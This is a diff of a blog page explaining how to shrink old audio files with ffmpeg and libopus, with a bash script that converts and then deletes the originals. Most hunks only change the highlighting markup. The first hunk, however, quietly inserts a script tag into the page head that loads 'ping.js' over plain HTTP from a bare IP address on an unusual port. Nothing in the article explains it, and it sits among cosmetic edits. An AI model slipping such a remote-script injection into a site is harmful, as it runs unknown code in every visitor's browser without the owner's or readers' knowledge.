@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -94,7 +96,7 @@ August 27, 2022
 <p>The current documentation of <a href="https://ffmpeg.org/">FFmpeg</a> gives a ranking of the encoders available, from best (left) to not so good (right):</p>
 <pre><code>libopus &gt; libvorbis &gt;= libfdk_aac &gt; libmp3lame &gt;= eac3/ac3 &gt; aac &gt; libtwolame &gt; vorbis &gt; mp2 &gt; wmav2/wmav1</code></pre>
 <p>So the idea is to re-encode an arbitrary audio file to <code><span class="highlight-candombe-inline">libopus</span></code>:</p>
-<div class="highlight-candombe"><pre><span></span><code>ffmpeg -i <span class="nv">$fn</span> -acodec libopus <span class="nv">$name</span>
+<div class="highlight-candombe"><pre><span></span><code>ffmpeg<span class="w"> </span>-i<span class="w"> </span><span class="nv">$fn</span><span class="w"> </span>-acodec<span class="w"> </span>libopus<span class="w"> </span><span class="nv">$name</span>
 </code></pre></div>
 
 <p>For the output file <code><span class="highlight-candombe-inline">ffmpeg</span></code> can save the audio into a container. Different container files exists (<code><span class="highlight-candombe-inline">.m4a</span></code>, <code><span class="highlight-candombe-inline">.mp4</span></code>, <code><span class="highlight-candombe-inline">.ogg</span></code>, <code><span class="highlight-candombe-inline">.flv</span></code>) but today’s internet stream platforms use <code><span class="highlight-candombe-inline">.webm</span></code>.</p>
@@ -108,7 +110,7 @@ You could write directly <code><span class="highlight-candombe-inline">.opus</sp
 <p>One of the things of better encoders is that we can use a lower bit rate without losing quality, as long as we are in the expected numbers for which the encoder was designed.</p>
 <p>For <code><span class="highlight-candombe-inline">libopus</span></code> we need bit rates of 32kbps or larger.</p>
 <p>Doing a quick, totally subjective test, ~50k is the smallest bit rate that maintains the same quality of my files (which range between 96k and 128k MP3).</p>
-<div class="highlight-candombe"><pre><span></span><code>ffmpeg -i <span class="nv">$fn</span> -acodec libopus -b:a 50k <span class="nv">$name</span>.webm
+<div class="highlight-candombe"><pre><span></span><code>ffmpeg<span class="w"> </span>-i<span class="w"> </span><span class="nv">$fn</span><span class="w"> </span>-acodec<span class="w"> </span>libopus<span class="w"> </span>-b:a<span class="w"> </span>50k<span class="w"> </span><span class="nv">$name</span>.webm
 </code></pre></div>
 
 <p>Final tweak, I have some videos which I only care their audio. We can instruct <code><span class="highlight-candombe-inline">ffmpeg</span></code> to get those with the “no video” option (<code><span class="highlight-candombe-inline">-nv</span></code>).</p>
@@ -116,36 +118,36 @@ You could write directly <code><span class="highlight-candombe-inline">.opus</sp
 <p>The <a href="/assets/misc/compress-old-audio-files/compress_audio.sh"><code><span class="highlight-candombe-inline">compress_audio.sh</span></code></a> script follows:</p>
 <div class="highlight-candombe"><pre><span></span><code><span class="ch">#!/bin/bash</span>
 
-<span class="nb">set</span> -euo pipefail
-<span class="nb">shopt</span> -s nocaseglob
+<span class="nb">set</span><span class="w"> </span>-euo<span class="w"> </span>pipefail
+<span class="nb">shopt</span><span class="w"> </span>-s<span class="w"> </span>nocaseglob
 
-<span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$#</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;1&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
-    <span class="nb">echo</span> <span class="s2">&quot;Usage </span><span class="nv">$0</span><span class="s2"> &lt;target dir&gt;&quot;</span>
-    <span class="nb">exit</span> <span class="m">1</span>
+<span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$#</span><span class="s2">&quot;</span><span class="w"> </span>!<span class="o">=</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Usage </span><span class="nv">$0</span><span class="s2"> &lt;target dir&gt;&quot;</span>
+<span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
 <span class="k">fi</span>
 
-<span class="nb">cd</span> <span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
-<span class="nb">echo</span>  <span class="s2">&quot;Processing </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">...&quot;</span>
+<span class="nb">cd</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$1</span><span class="s2">&quot;</span>
+<span class="nb">echo</span><span class="w">  </span><span class="s2">&quot;Processing </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">...&quot;</span>
 
 <span class="nv">IFS</span><span class="o">=</span><span class="s1">$&#39;\n&#39;</span>
-<span class="k">for</span> fn <span class="k">in</span> <span class="k">$(</span>ls *.mp3 *.ogg *.wav *.wma *.m4a *.avi *.opus<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
-    <span class="nv">name</span><span class="o">=</span><span class="k">$(</span>basename -- <span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span><span class="k">)</span>
-    <span class="nv">ext</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">name</span><span class="p">##*.</span><span class="si">}</span><span class="s2">&quot;</span>
-    <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">name</span><span class="p">%.*</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="k">for</span><span class="w"> </span>fn<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>*.mp3<span class="w"> </span>*.ogg<span class="w"> </span>*.wav<span class="w"> </span>*.wma<span class="w"> </span>*.m4a<span class="w"> </span>*.avi<span class="w"> </span>*.opus<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nv">name</span><span class="o">=</span><span class="k">$(</span>basename<span class="w"> </span>--<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span><span class="k">)</span>
+<span class="w">    </span><span class="nv">ext</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">name</span><span class="p">##*.</span><span class="si">}</span><span class="s2">&quot;</span>
+<span class="w">    </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">name</span><span class="p">%.*</span><span class="si">}</span><span class="s2">&quot;</span>
 
-    <span class="c1"># Take the input (-i) file, ignore any video stream (-vn)</span>
-    <span class="c1"># and change its audio codec (-acodec) tto the codec libopus</span>
-    <span class="c1"># and change its audio bitrate (-b:a) to 50k</span>
-    <span class="c1"># and save it under the same name but with .webm extension</span>
-    ffmpeg -i <span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span> -vn -acodec libopus  -b:a 50k <span class="s2">&quot;</span><span class="nv">$name</span><span class="s2">.webm&quot;</span>
+<span class="w">    </span><span class="c1"># Take the input (-i) file, ignore any video stream (-vn)</span>
+<span class="w">    </span><span class="c1"># and change its audio codec (-acodec) tto the codec libopus</span>
+<span class="w">    </span><span class="c1"># and change its audio bitrate (-b:a) to 50k</span>
+<span class="w">    </span><span class="c1"># and save it under the same name but with .webm extension</span>
+<span class="w">    </span>ffmpeg<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span><span class="w"> </span>-vn<span class="w"> </span>-acodec<span class="w"> </span>libopus<span class="w">  </span>-b:a<span class="w"> </span>50k<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$name</span><span class="s2">.webm&quot;</span>
 
-    rm <span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span>
+<span class="w">    </span>rm<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span>
 <span class="k">done</span>
 </code></pre></div>
 
-<p>The script processes the files inside a folder. Any error and the processing will stop and fail so the input file will not be deleted (<code><span class="highlight-candombe-inline">rm <span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span></span></code>).</p>
+<p>The script processes the files inside a folder. Any error and the processing will stop and fail so the input file will not be deleted (<code><span class="highlight-candombe-inline">rm<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$fn</span><span class="s2">&quot;</span></span></code>).</p>
 <p>The script does <em>not</em> work recursively, instead I use <code><span class="highlight-candombe-inline">find</span></code>.</p>
-<div class="highlight-candombe"><pre><span></span><code>find . -type d -exec compress_audio.sh <span class="o">{}</span> <span class="se">\;</span>
+<div class="highlight-candombe"><pre><span></span><code>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span>-exec<span class="w"> </span>compress_audio.sh<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span>
 </code></pre></div>
 
 <p>This is on purpose: if <code><span class="highlight-candombe-inline">compress_audio.sh</span></code> fails, that folder is skipped (no file is further processed or removed) but the whole recursive scan keeps on (<code><span class="highlight-candombe-inline">find</span></code> will not stop on an error).</p>
